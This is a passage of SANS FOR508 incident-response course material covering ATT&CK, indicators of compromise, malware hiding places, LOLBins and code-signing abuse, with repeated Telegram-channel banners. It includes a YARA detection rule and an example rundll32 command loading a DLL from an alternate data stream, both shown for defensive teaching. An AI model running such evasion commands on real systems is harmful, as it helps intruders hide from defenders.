from sequential intrusions. A lack of key indicators results in an inability to define adversaries, and an inability
to define adversaries leaves network defenders responding post-compromise to every intrusion. In short,
inability to reconstruct intrusions should be considered an organizational failure of CND, and intelligence-based
detections prior to system compromise a success. Defining campaigns, as demonstrated here, is one effective
way to facilitate success.
Sourced with permission from Mike Cloppert and originally published on the SANS Computer Forensics Blog at
https://for508.com/1yvt6 and officially branded by Lockheed Martin at https://for508.com/s6e18

42

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK™)

Tactical
descriptions of
“common” activity
shared by many
adversary groups

Techniques
grouped by tactical
goal of adversary

•Credential access
•Persistence
•Lateral movement

Good starting point
for list of “What do
we look for?”
indicators

Many
techniques/tactics
discussed in
FOR508

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

43

.

Threat hunting is often frustrating and ineffective if your team lacks effective threat intelligence. Actionable
threat intelligence is key to helping your organization detect and defend against advanced attacks. Adversarial
Tactics, Techniques, and Common Knowledge (ATT&CK™) is a model and framework for describing the
actions an adversary may take while operating within an enterprise network. The model is designed to help
characterize and describe post-compromise adversary behavior. It both expands the knowledge of network
defenders and assists in prioritizing network defense by detailing the post-compromise (post-exploit and
successful access) tactics, techniques, and procedures (TTPs) advanced persistent threats (APT) use to execute
their objectives while operating inside a network. Data has been compiled through collaboration with a wide
range of partners and via multiple disciplines including network defense, penetration testing, and Red Teaming.
We like ATT&CK because it is currently the most detailed resource available on the universe of attacker
techniques and guidance on how to hunt for evidence of them. It is threat and vendor-agnostic and focuses on
TTPs all adversaries use to make decisions, expand access, and execute their objectives. It aims to describe an
adversary's steps at a high enough level to be applied widely across platforms, but still maintains enough details
to be technically useful. It is an excellent starting (and ending) place when building threat hunting and
defensive capabilities. We frequently leverage the ATT&CK framework to ensure we cover the most relevant
tactics and techniques in this class. As an example, there are a small number of lateral movement techniques
shared across most threat actors, providing an obvious and lucrative place to search for evidence of compromise.
You will see those techniques in an upcoming section.
ATT&CK details were sourced from the MITRE website: https://attack.mitre.org. ATT&CK and ATT&CK
Matrix are trademarks of The MITRE Corporation

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

43

ATT&CK Categories

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The MITRE ATT&CK matrix is a comprehensive knowledge base and framework providing information about
the tactics, techniques, and procedures (TTPs) adversaries use to conduct cyberattacks.[1] ATT&CK stands for
Adversarial Tactics, Techniques, and Common Knowledge. MITRE ATT&CK was developed and is maintained
by MITRE Corporation. ATT&CK is organized into a matrix format, with tactics listed on the vertical axis and
techniques listed on the horizontal axis. Each cell in the matrix represents a specific technique used by
adversaries to achieve a particular tactic. For example, a tactic like "Privilege Escalation" may include
techniques such as "Exploiting Windows Admin Tasks" or "Bypassing User Account Control (UAC)". The
ATT&CK matrix provides myriad benefits:
Cybersecurity Knowledge Sharing: The matrix serves as a publicly accessible repository of knowledge about
real-world cyber threats and attack techniques. It provides cybersecurity professionals, incident responders,
threat hunters, and researchers with valuable information to understand and respond effectively to cyber threats.
Standardized Language: ATT&CK creates a standardized language and taxonomy to describe cyber adversary
behavior, making it easier for the cybersecurity community to communicate and share information about
specific threats and incidents.
Detection and Defense: The matrix is a valuable resource for building and improving cybersecurity defenses. By
understanding the tactics and techniques that adversaries use, organizations can better design and deploy
security controls to detect and prevent those tactics.
Incident Response and Threat Hunting: When dealing with a security incident, the ATT&CK matrix helps in
identifying the specific techniques used by threat actors. This knowledge aids in better incident response and
threat hunting, allowing organizations to proactively search for traces of known techniques in their environment.
Red Teaming and Assessment: The matrix is useful for red teaming exercises and security assessments. Red
teams simulate real-world cyber attacks to identify weaknesses in an organization's defenses. By emulating
adversary tactics from the ATT&CK matrix, red teams can help organizations identify and address potential
vulnerabilities.

44

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

44

Cyber Threat Intelligence: The ATT&CK matrix provides an essential foundation for cyber threat intelligence
analysis. Analysts can map observed or reported adversary behavior to the matrix, helping to categorize and
understand the tactics and techniques employed by threat actors.
ATT&CK is comprised of multiple threat matrices, documenting threats for Windows, macOS, Linux, mobile,
network, cloud, and even industrial control systems. This class will stay focused on the Windows Enterprise
matrix. Techniques, tactics, and mitigations are covered for each element. ATT&CK is also expressed in STIX
2.0 format and can be found on the MITRE Cyber Threat Intelligence GitHub repository: [2]
Categories Descriptions from the Windows Enterprise ATT&CK matrix: [1]
Reconnaissance: The adversary is trying to gather information they can use to plan future operations
Resource Development: The adversary is trying to establish resources they can use to support operations.
Initial Access: The adversary is trying to get into your network.
Execution: The adversary is trying to run malicious code.
Persistence: The adversary is trying to maintain their foothold.
Privilege Escalation: The adversary is trying to gain higher-level permissions.
Defense Evasion: The adversary is trying to avoid being detected.
Credential Access: The adversary is trying to steal account names and passwords.
Discovery: The adversary is trying to figure out your environment.
Lateral Movement: The adversary is trying to move through your environment.
Collection: The adversary is trying to gather data of interest to their goal.
Command and Control: The adversary is trying to communicate with compromised systems to control them.
Exfiltration: The adversary is trying to steal data.
Impact: The adversary is trying to manipulate, interrupt, or destroy your systems and data.
Many of these techniques are covered in FOR508, but they also touch on techniques covered in FOR572
(Network Forensics) and FOR610 (Malware Analysis). In this class, we focus on techniques seen most
frequently in the wild and with the highest effort-to-hit ratios, with the goal of rapid detection of intrusion
activity.

.

[1] MITRE ATT&CK: https://for508.com/9mjrc
[2] MITRE Cyber Threat Intelligence GitHub repository: http://for508.com/ik5dy

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

45

.
46

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Threat Intelligence and ATT&CK Mapping

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

47

.

A goal of FOR508 is to educate analysts and hunters on attacker techniques and demonstrate how to find them
across the enterprise. At the completion of this course, we expect you to have a very strong understanding of the
most common attacker techniques and a toolkit for identifying and mitigating those techniques. The good news
is the list of common attack techniques is manageable; the bad news is the set is growing and there will always
be more obscure techniques discovered in the wild. The ATT&CK framework is an excellent resource for
keeping up to date on attacker techniques and associated artifacts. By looking at attacks through this lens, you
can identify new techniques to hunt for and judge the effectiveness of your current data sources and hunting
toolkit. As an example, by mapping the “DoubleTap” malware on this slide to common techniques, you have an
immediate list of items to hunt.[1] Do you have the capability to audit and stack Windows scheduled tasks across
your environment? Are you aggregating command-lines and analyzing that data store for commonly used
attacker commands? Are you collecting NetFlow data that can quickly identify uncommon port usage? The
power of ATT&CK is it can help teams organize and prioritize their efforts while providing in-depth
descriptions of techniques in use across different attacks and threat actors.
The easiest way to learn more about attacker techniques is by leveraging the wealth of open-source threat
reports available. More and more vendors are mapping their threat intelligence to ATT&CK techniques. The
mapping on this slide was accomplished by Katie Nickels in the excellent guide “Getting Started with Att&ck
October 2019” (https://attack.mitre.org).
[1] https://www.fireeye.com/blog/threat-research/2014/11/operation_doubletap.html

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

47

Indicators of Compromise (IOC)

• A formal language allowing
artifacts to be described in clear
and unambiguous terms
• Facilitate information sharing
• Describe once, find many

• Several standards
• IOCs vary wildly in efficacy
• Home-grown often most applicable

• Tools typically drive usage
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

An indicator of compromise (IOC) describes attacker tools and tradecraft using a rich and precise language that
can be understood by both humans and security tools. IOCs can be a particularly powerful technique to identify
malware components on a compromised host. Generally, they include a combination of Boolean expressions
that can be used to identify characteristics of malware. If these characteristics are found and the Boolean
conditions satisfied, then you have a hit. Since finding the first hit is one of the most challenging parts of
incident response, a targeted set of IOCs can greatly speed up the IR process.
There are two broad types of indicators: host-based and network-based (similar to snort signatures, plus
additional data). IOCs are the equivalent to narrowing down a suspect through identifying specifics about the
suspect: male, 6 ft. 2 in., ~200 lbs., shaved head, blue eyes, and driving a red or orange Nissan Xterra.
Indicators of compromise are typically created by reversing malware and through application footprinting. Some
mature security teams have massive IOC lists that range in the thousands of indicators collected from previous
intrusions. IOCs are the difference between having to analyze each system in-depth or analyzing a few in-depth
and using that data to identify similar machines on your network with the same characteristics.
Indicator Sharing
With the increasing use of threat intelligence data, several competing projects are maintained. Which indicators
you use in your environment will largely be driven by your security stack. Different security tools leverage
different signatures, which means you may have to provide care and feeding for multiple different indicator
types. Not all IOCs are created equal, and you may find many terrible IOCs being circulated via information
sharing networks. IOCs are not a “fire and forget” technology. They require active management, testing, and
modification to be used effectively. The best IOCs typically are those you develop tied to your own network
and via your own investigations.
STIX = Structured Threat Information eXpression
From the website: STIX™ is a collaborative community-driven effort to define and develop a standardized
language to represent structured cyber threat information. The STIX Language intends to convey the full range
of potential cyber threat information and strives to be fully expressive, flexible, extensible, automatable, and as
human-readable as possible. All interested parties are welcome to participate in evolving STIX as part of its
open, collaborative community. https://for508.com/58a14
48

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

48

YARA
YARA is a tool aimed at (but not limited to) helping malware researchers to identify and classify malware
samples. With YARA, you can create descriptions of malware families (or whatever you want to describe)
based on textual or binary patterns. Each description (known as rule) consists of a set of strings and a Boolean
expression, which determines its logic. You can find more information on YARA here: http://for508.com/-10oz
OpenIOC
OpenIOC was originally designed to enable MANDIANT’s products to codify intelligence in order to rapidly
search for potential security breaches. MANDIANT has standardized and open sourced the OpenIOC schema
and released some basic utilities to support the standard. While you will still see indicators in OpenIOC format,
its popularity has diminished within the security community. Conversion of OpenIOC to
STIX: http://for508.com/ntkfy.

.

Two popular tools for managing indicators of compromise are CRITS (http://for508.com/st2ce) and MISP
(https://www.misp-project.org/). These tools support all the above IOC formats.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

49

Indicators of Compromise: YARA
rule SeaDuke_Sample {
meta:
description = "SeaDuke Malware"
license = "https://creativecommons.org/licenses/by-nc/4.0/"
author = "Florian Roth"
reference = "http://goo.gl/MJ0c2M"
strings:
$s0 = "bpython27.dll" fullword ascii
$s1 = "email.header(" fullword ascii
$s2 = "LogonUI.exe" fullword wide
$s3 = "Crypto.Cipher.AES(" fullword ascii
$s4 = "mod is NULL - %s" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 4000KB and all of them
}

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

YARA is currently the most widely used indicator of compromise format. Its popularity stems from striking the
right balance of simplicity and power, making it easy for malware analysts and incident responders to identify
and classify malware samples. YARA rules are written to match patterns, and the rules themselves are easily
understood by both machines and human operators.

.

While many YARA rules are strings based, more sophisticated rules can be crafted using regular expressions,
wildcards, conditions, and modules such as pe header components from the portable executable structures. In
the example on this slide, the matched condition requires a 1) “MZ” portable executable signature, 2) a file size
limit, and 3) matching of five specific strings found inside the file. The goal of an IOC is to create a signature
that is specific enough to limit false positives at scale, while being broad enough to still match different variants
of the same malware sample. This is a difficult balance and is why different IOCs have wildly different efficacy
rates.

50

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

50

Advanced Incident Response and Threat Hunting Agenda

Incident Response & Threat Hunting
Threat Intelligence
Malware-ology
Malware Persistence
Incident Response: Hunting Across the Enterprise
Credential Theft
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

51

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

51

Malware-ology

Attacker Tools, Techniques, and Procedures:
Malware TTPs
“We don’t use the word ‘intelligence’ with software. We regard that as a
naive idea. We say that it’s ‘complex.’ Which means that we don’t
always understand what it’s doing.”
— Orson Scott Card, Ender's Shadow

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

52

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

52

Malware Paradox

Malware Can Hide, But It Must Run

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

53

.

Malware Paradox
Several years ago, Jesse Kornblum stated, “Malware Can Hide, But It Must Run,” and this became known as the
Malware Paradox.[1] The paradox means that malware can exist but sooner or later something must activate it to
run. Execution leaves telltale artifacts. As an example, methods to keep malware “persistent” across multiple
reboots on a system is called a “persistence mechanism.” It is a simple piece of evidence to look for and could
possibly help us point, in reverse, back to the malware—more on that shortly.
[1] Exploiting the Rootkit Paradox with Windows Memory Analysis http://for508.com/-g86k

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

53

FOR508 Intrusion Methodology Roadmap
1

2

3

Threat Hunting & Assessment
Collection and analysis at scale across the
enterprise. Begin identification and scoping.

Triage Collection & Analysis
Targeted data acquisition to validate findings
and develop threat intelligence.

Deep-Dive Forensics
In-depth analysis on systems and malware to
further identify tradecraft and build IOCs.

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Your journey through FOR508 has been designed to follow a standard workflow for performing threat hunting,
compromise assessments, and incident response activities. The roadmap we will use in this class is as follows:

.

Threat Hunting & Assessment
We will start our process by looking at the network using tools that can scale collection and analysis, focusing
on occurrence stacking and outlier analysis. Most attendees have thousands of endpoints necessitating broad
scoping techniques at the start of an investigation.
Triage Collection & Analysis
As systems of interest are identified, we will perform targeted triage collection to acquire a deeper
understanding of attacker activity. Triage data can include traditional forensic artifacts like application
execution data, file system information, and in-memory artifacts such as process trees.
Deep-Dive Forensics
Finally, we will reserve our limited analyst time for performing deep-dive forensics on only a handful of
systems having the best chance to help us understand attacker tools and tradecraft and craft better indicators to
assist with scoping additional compromised systems.

54

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

54

Threat Hunting: “Compromise Type”

1

Systems with Active Malware

2
3

Systems with Dormant Malware (Not Active or Cleaned)

Systems without Tools or Malware (Living Off the Land)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

55

Systems involved in a compromise can be largely collected into three categories, as seen on this slide. During
the course of FOR508 you will see systems that fit into each category and get a good understanding of how each
can be identified. We will build a kit of tools and techniques that can assist with hunting and identifying
compromised systems of each type.

.

Three Possible Detection Types
When hunting for a compromise, active malware is often the easiest to identify. Active malware generates a
wealth of artifacts, providing more opportunities for responders to identify it. Dormant malware can be much
harder to detect, as we lose the recency of artifacts and ability to detect the malware in memory. Dormant
malware is a broad category and could consist of a tool that was only run once, such as a credential dumper, or
something executed rarely via something like Word macro or via a scheduled task. Systems that are cleaned by
attackers or are detected long after the attack occurred also fall into this category. We will have to work harder
to find evidence of compromise in these cases. The final category to consider are systems interacted with by the
attacker, but with no tools or malware introduced. This last type is the hardest to investigation, and good
attackers know this. While working through the attack cycle, there are many steps taken by attackers that do not
require new tools or malware. Being able to log on to a system using valid credentials and subsequently
searching for data to exfiltrate leaves a very small and difficult-to-detect footprint. We have also seen an uptick
of use of “living off the land” techniques, meaning using built-in utilities to accomplish actions usually done
with external tools. While detection is possible across all categories, the latter require good data collection and
even better analysts!

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

55

Hunting Evil: From Automated to Manual
IR/HUNTING ACTIVITY

Threat Hunting &
Assessment

Triage
Collection &
Analysis

Deep-Dive
Forensics

DETECT
TYPE

Antivirus and Signatures

1

2

Indicators of Compromise Search

1

2

Automated Process Anomalies

1

Malware Behavior Anomalies

1

2

Malware Persistence

1

2

Triage / EDR Artifacts and Logs

1

2

3

Timeline Analysis

1

2

3

Memory Analysis

1

Targeted Single Host Forensic

1

2

3

MFT and Filesystem Anomalies

1

2

FOR508 | Advanced Incident
Response, Threat
Hunting,
and Digital Forensics
Anti-Forensic
Residue
Anomalies
1 2

Defending a network requires balancing of limited resources across increasingly large enterprises. It is simply not
feasible to perform every forensic test on every system in a network. The goal is to look for capabilities allowing
scoping and analysis to be conducted at scale, while reserving the deep forensic techniques for only a small subset
of systems.

.

As hunting or incident response begins, the focus starts with enterprise-wide collection and using automated
signature detections whenever possible. These signatures could be as simple as your host-based anti-virus or more
robust indicator of compromise signatures leveraging threat intelligence and tools like enterprise detection and
response (EDR). As we covered earlier, some of your best threat intelligence is derived internally from deep dive
and targeted triage analysis of compromised hosts. These more expensive and time-consuming operations support
scoping an environment en masse. Some or all of this activity at this stage may be accomplished at your security
operations center (SOC).
Triage collection and analysis begins either with alerts from the previous phase or using a hypothesis and
predictions of where adversaries might appear. This stage starts to focus on standard aberrant characteristics of
malware, the search for persistence, deep log file analysis, and scalable forensic artifacts showing lateral
movement, data collection, and evidence of malware execution. It is hard to automate the analysis for a lot of this
activity, but still possible to perform automated collection. Analysis techniques such as data stacking, frequency of
least occurrence, and behavioral anomaly detection are applied. The downside is you need humans (hunters) to
work through the data to identify likely candidates for deeper inspection. Triage data can be collected from a
specific system or at scale across many, placing the data into large databases like Splunk or Elastic.
Finally, once an anomalous candidate system is identified, the hunter will sometimes need to take a much closer
look at the system. We call this deep-dive forensics, and it allows validation of compromise and the creation of
cyber threat intelligence. Indicators extracted from deep dive analysis eventually become automated signatures
used to scan the enterprise at the assessment or triage phases. Deep-dive digital forensics can provide answers to
hard questions like initial exploitation, how credentials were stolen, adversary intent, and data
collection/exfiltration.

56

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

3

.

How does an analyst know which systems to perform deep dive analysis against? There are no hard and fast
rules, but when you find a system that does not match known patterns from an adversary or is an unknown, a
closer look should be accomplished. Proper analysis will fill gaps in your capabilities for cyber threat
intelligence, allowing you to better track that specific adversary. It could be key not only to scoping the current
intrusion, but also to finding the same adversary in future intrusions.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

57

Detecting Compromised Endpoints w ithout Active Malware
Program
Execution

Prefetch

ShimCache

AmCache

UserAssist

SRUM

File
Opening

Shortcut Files

Jump Lists

ShellBags

Prefetch

OpenSaveMRU

File
Knowledge

WordWheelQuery

Last Visited MRU

Sho rtcut Files

Recycle Bin

Typed Paths

Event Logs

User Logons

RDP Usage

RunAs Events

Process Tracking

PowerShell Logs

Browser
Usage

History

Cookies

C ache

Session Restore

TypedURLs

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

It is much easier to detect systems with active malware than systems with only left-over residue. Because
systems cleaned or compromised with living-off-the-land techniques often require deep dive forensics, the
enormity of the analysis across an enterprise is daunting. However, in practice, detection is the same as systems
with active malware—find traces of attacker activity and scan the enterprise looking for those same fragments.
It just turns out the fragments are harder to find on these systems. Hackers change their profile, but not often
enough that their profile will be completely unique on each system. Forensic analysis is very important in this
phase of the investigation to identify the patterns of attacker activity. As seen on this slide, we have an
enormous set of forensic artifacts used to detect activity of interest on a system. Forensic skills for intrusion
scenarios are very similar to those required for tracking other crimes.
This class assumes some familiarity with what we call, “conversational forensics.” For example, if we are
determining whether malware was executed on a machine, I might mention, “I looked at the prefetch folder for
malware execution and found nothing in the UserAssist key. However, I did find some evidence in the
ShellBags that might be useful for our damage assessment.” Conversational forensics means you are familiar
with most of the terms, and although you might not have them all memorized, a quick mention of the artifact
reminds you of what it tells us. If you are not at this level yet, never fear! The Windows Forensic Analysis
poster from the SANS FOR500 is here to help. It is a terrific resource to reference as we go through this class
and when you perform these investigations for real. You can find it in your course dropbox and downloadable
online. Some of the techniques taught in this class become even more powerful as you develop a deeper forensic
skillset. SANS FOR500 is the “other half” of this class and would be a great follow-on when you are ready to
take your deep-dive forensic skills to the next level.

58

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

58

.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

59

Adversary Hiding in Plain Sight
• Common Malware Names
• svchost.exe
• iexplore.exe
• explorer.exe
• lsass.exe
• win.exe
• winlogon.exe

• Common Malware Locations

• \Temp folders
• \AppData
• \$Recycle.Bin
• \ProgramData
• \Windows
• \Windows\System32
• \WinSxS
• \System Volume Information
• \Program Files and \Program Files (x86)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

We are going to see techniques from some of the most advanced malware toolkits on the planet this week.
Rootkits, bootkits, side-loading, process hollowing, and injection are all extremely powerful means to hide
malicious activity. While it is fun to “geek” out on those advanced samples, it is often just as effective for
malware to simply pick a name and location and blend into the noise. In fact, the simple approach can make
attacks even more survivable without the risk of creating instability, crashing processes, or getting detected with
the next security tool installed. A standard Microsoft Windows system has hundreds of thousands of files and
thousands of folders to house those files. And the average enterprise has thousands of these systems. Among all
that noise, finding a believable name and location for your malware or backdoor to live is quite easy.
While malware names and locations are only limited by human creativity, there is commonality among malware
and threat groups. As an example, svchost.exe remains one of the most popular names for malware on the
planet. This is almost certainly due to it being a process found running with at least 10+ instances on modern
systems, with many administrators having no idea why.[1] This slide contains some of the most common
malware names and locations we have seen in the wild, but you will undoubtedly find more in your
investigations. Stay curious and suspicious. Think about context. Does it ever make sense for something to
execute from the $Recycle Bin? Threat reports, and resources like Virus Total, can give more ideas of places to
focus (the live statistics from VirusTotal are quite interesting).[2]
[1] The typographical and homomorphic abuse of svchost.exe: http://for508.com/j2v1i
[2] VirusTotal Statistics: http://for508.com/c2-bk

60

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

60

Living off the Land Binaries (LOLBin)

• Legitimate binaries are increasingly used to evade
security tools, allow-listing and hunting
• rundll32.exe “c:\kb4549947:aclui.dll”,DllMain

• Command lines provide context
• Executions, downloads, creation of files, child processes

The LOLBAS project
collects, categorizes, and
provides example usage
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

61

.

Built-in system binaries (executables) have been abused since the first operation systems. While their use is
nothing new, we have witnessed a large growth in the volume of illegitimate usage in the Windows world. This
growth is an extension of the “living off the land” approach to attacks and is a direct result of host-based
security tools getting better at detecting and preventing malicious code from executing. Imagine an application
control product that is highly reliant on digital signatures. Instead of using a home-grown tool (unsigned) to
copy a locked credential file from a sensitive folder, why not use one of the many built-in Windows tools
(digitally signed by Microsoft) to accomplish the task? As research into the use of native Windows tools has
increased, the number of creative and surprising use cases of standard Windows tools has exploded. The
LOLBAS (Living Off the Land Binaries and Scripts) project was started by Oddvar Moe and does an excellent
job of collecting and categorizing relevant attacker use cases for legitimate Windows binaries.[1] This is a great
place to familiarize yourself with the various binaries and the myriad of ways they can be abused. Better yet, try
some of the techniques on your own system so you can better understand how they could be useful to an
attacker!
Many of the examples on this slide are extremely popular in the wild. Bitsadmin.exe and Certutil.exe are used
extensively by attackers for stealthy file downloading. We also regularly see Certutil.exe abused to decode
obfuscated payloads, attempting to avoid host-based security. Rundll32.exe is a legitimate means to run code
present in a DLL. It requires the name of a DLL, the function name to execute within the DLL, and any
additional arguments. Since this binary is legitimately used in Windows to run code, you can see why it might
be difficult to weed out legitimate versus illegitimate uses. From a defender’s perspective we need more
information than just “rundll32.exe” executed. We need the context that comes along with the full command
line and arguments, along with the DLL that was executed (if possible). In the example on this slide, the DLL
loaded is in an alternate data stream (notice the colon in the filename), which is highly unusual and a strong
indicator for suspicion. Knowing if there were any files downloaded or created by the tool, and what child
processes were spawned in memory could also be very helpful. The fact that tools like memory forensics and
EDR (endpoint detection and response) give this context is a big reason they have become so useful to the
modern defender.
[1] LOLBAS Project: https://for508.com/pahr5

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

61

Malware Common Defense Evasion Techniques
• Service Hijacking/Replacement
• Process Injection
• Filename/Service Hijacking
• Alternate Data Streams
• WebShells/Beacons
• Firmware
• DLL Injection
• A/V Bypass
• Frequent Compilation
• Binary Padding
• Packing/Armoring
• Dormant Malware
• Signing Code with Valid Cert
• Anti-Forensics/Timestomping
• Rootkits
• “Fileless” Malware
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Hiding in plain sight is one successful technique employed by malicious software, but certainly not the only one.
There are myriad other ways malware authors have devised to stay hidden and accomplish the mission. This
slide contains many of the common techniques, and we will see and talk about most of these throughout the
course. An important concept to understand is malware authors must make decisions, and there is never a
perfect choice. Process injection may be very stealthy to many of the API-based security and analysis tools but
be trivial to identify with memory introspection. Packing or armoring an executable can easily evade most antivirus products but creates a highly anomalous file easily found in other ways, such as identifying the amount of
compression, encryption, or unusual sections within the executable. Signed code might help evade security and
allowlisting solutions but becomes ineffective once that code signing certificate is identified as evil and revoked.
Just like in physics, every action has an equal and opposite reaction. We use the signatures and artifacts created
by these various evasion techniques to find evil. Some of the artifacts can be quite subtle and difficult to parse
from normal activity. This is exactly why threat hunting is so important. Hunters can perform analysis and
create interesting patterns to find new techniques. You will learn many of these techniques this week.

62

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

62

Trusted Code Signing

Signed Code
= Trusted?

Auth Process
• Individual
Developers
• Passport
Phone Bill
•
• Phone Call
• Commercial
Developers
• Physical Address
• Domain Owner
• D-U-N-S Rating

Rapid
increase in
certificate
applications
since 2010—
Smartphone
Developers

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

63

.

Trusted code signing is intended to increase the security and trustworthiness of programs downloaded from the
Internet. In the past, when most programs were bought at physical stores, programs were inherently trusted
because they came in original packages that were shrink wrapped. Code signing is intended to produce the same
trust in programs purchased and downloaded across the Internet. It is fairly trivial to “self-sign” code. However,
trusted code was intended to be a different story. With signed and trusted code, one wouldn’t have to worry
about it being malicious—or at least that was the intent. In practice, signed malware is a real threat and has
been seen multiple times in highly publicized incidents.
How is trusted code signing supposed to work? A certification authority, such as Verisign or Thawte, verifies
and confirms identity information, issuing a valid digital certificate to the organization or individual. The intent
of the certification is to identify the original code author. Once issued, the developer can use his or her private
key to digitally “sign” the code, providing attribution. Authentication of organizations and/or individuals
applying for a code signing certificate varies widely. For some companies, you need to provide a copy of your
passport or even a phone bill and the certification authority will call the number for verification.[1] In other
instances, authorities may ensure you are not on a restricted organization list from the government, have a
business license, exist at a physical address, have rights to the domain name, and are verified by a third-party
phone number. To obtain a commercial software certification, most organizations must also apply for a Dun &
Bradstreet Rating. According to MSDN, “Applicants must achieve a level of financial standing as indicated by
a D-U-N-S number (which indicates a company's financial stability) and any additional information provided by
this service. This rating identifies the applicant as a corporation that is still in business. Corporations that do not
have a D-U-N-S number at the time of application (usually because of recent incorporation) can apply for one
and expect a response in less than two weeks.”[2]
The Dun & Bradstreet rating is intended to draw a very hard line to cross between commercial and private
(individual) developers. Although not impossible to create a front company to meet this criterion, the process is
lengthy and tedious. While achievable for criminal syndicates and nation-state adversaries, it may be less likely
for less resourced entities. An alternate route, chosen by some malware developers, is simply to steal
commercial-level code-signing private keys from someone else. This can be as easy as finding a private key
inadvertently added to a public Git repository. We have seen multiple instances of code-signing certificate theft

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

63

in the wild. Flame and Stuxnet are two high profile examples, but we have also seen code signing certificate
private keys stolen from Adobe and used to sign malicious software.[3] An attack on the company behind the
Opera browser allowed the compromise of their code signing private key, which was subsequently used to sign
malware.[4]
Code signing provides the ability to trust that code has not been tampered with after signing it, in addition to
aiding in identifying the origination of the code. Major operating systems will require code to be signed by a
trusted developer in order to allow them to execute without user interaction. In some of the latest Microsoft
server products drivers must be signed in order to load. Signed malware has an easier time spreading and hiding
on networks, but it does come with significant cost. If the malware is ever discovered, the code signing
certificate could be revoked and added to a Certificate Revocation List (CRL). The CRL list should be regularly
checked and any system with that software installed would no longer function. However, in practice, this
process has produced faulty results and has required major patches to Microsoft operating systems to update the
CRL list. Windows is working to improve this process and enforce even more signing requirements in future
updates. While code signing is still relatively rare for malware, it may very well be a requirement in the future.
Of course, there are always work arounds. We will likely see more advanced techniques like DLL Side-Loading
developed and employed to get around these restrictions.

.

[1] Enrollment Guide for Thawte Code Signing certificates (PDF): http://for508.com/1srk6
[2] Introduction to Code Signing: http://for508.com/oca3f
[3] Inappropriate Use of Adobe Code Signing Certificate: http://for508.com/a4u0k
[4] Stolen Opera Code-Signing Certificate Used to Sign Malware: http://for508.com/b5eon

64

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Will Malware Be Signed?

of malware is unsigned
Windows Defender ATP, 2019

McAfee reports between 1-3% signed malware. Microsoft Defender reports 4% signed
Know your adversary—Nation-state threat actors have a higher percentage of signed code
Don’t ignore signed code but consider focusing first on unsigned programs
Reduce datasets via trust of well-known companies: Microsoft, Apple, and Google
Signed programs in “system locations” not from a well-known entity are suspicious
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

65

.

Will Malware Be Signed? It depends. There are benefits and drawbacks to signing code. According to the
McAfee Labs 2019 Threat Report, much less than 3% of all malware is signed. In some quarters it was below
1%. In fact, the bar chart on this slide barely registers the “New Malicious Signed Binaries” because the numbers
were so low versus total malware identified each quarter. These percentages are consistent with the past several
years. Malware signing is predicted to increase over time, but the fact is that the total number of signed malware
samples compared to unsigned malware is very small. We can use this to our advantage as we hunt for malware
across our enterprise.
Benefits to Signing Malware
Signed malware is trusted by the operating system and can stay hidden for a longer period without arousing
suspicion. Espionage malware is a classic example, bringing to mind the infamous Flame malware, intended to
stay hidden for as long as possible. Signing is advantageous if the developer is not planning on using that
malware again and is willing to risk it being revoked if discovered.
Drawbacks to Signing Malware
Rapid development and release of malware will be inhibited by signing requirements. Malware authors often
need to rapidly develop alternatives to their code to avoid antivirus and host-based intrusion detection systems. A
malware author would need a plethora of code signing certs to avoid burning an entire family of malware active
across an enterprise if discovered. If a code signing cert is used and later revoked, all the current locations of the
malware will be flagged, becoming a major liability and easy means of detection. For malware that is rapidly
